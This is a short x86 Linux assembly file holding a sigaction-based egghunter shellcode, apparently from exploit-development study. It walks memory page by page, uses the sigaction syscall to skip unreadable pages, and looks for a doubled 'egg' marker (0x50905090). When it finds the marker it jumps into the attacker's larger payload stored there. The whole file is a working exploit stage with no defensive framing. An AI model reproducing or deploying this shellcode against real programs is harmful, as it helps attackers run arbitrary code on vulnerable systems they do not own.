global _start
section .text

_start:
; sigaction(2) implementation
page_align:
	or cx,0xfff 		; page alignment
next_address:
	inc ecx			    
	jnz not_empty		; avoid ecx = 0 
	inc ecx
not_empty:
	push byte +0x43		; sigaction(2)
	pop eax
	int 0x80
	cmp al, 0xf2
	jz page_align		; jz 0x0
	mov eax, 0x50905090	; egg
	mov edi, ecx
	scasd
	jnz next_address	; jnz 0x5
	scasd
	jnz next_address	; jnz 0x5
	jmp edi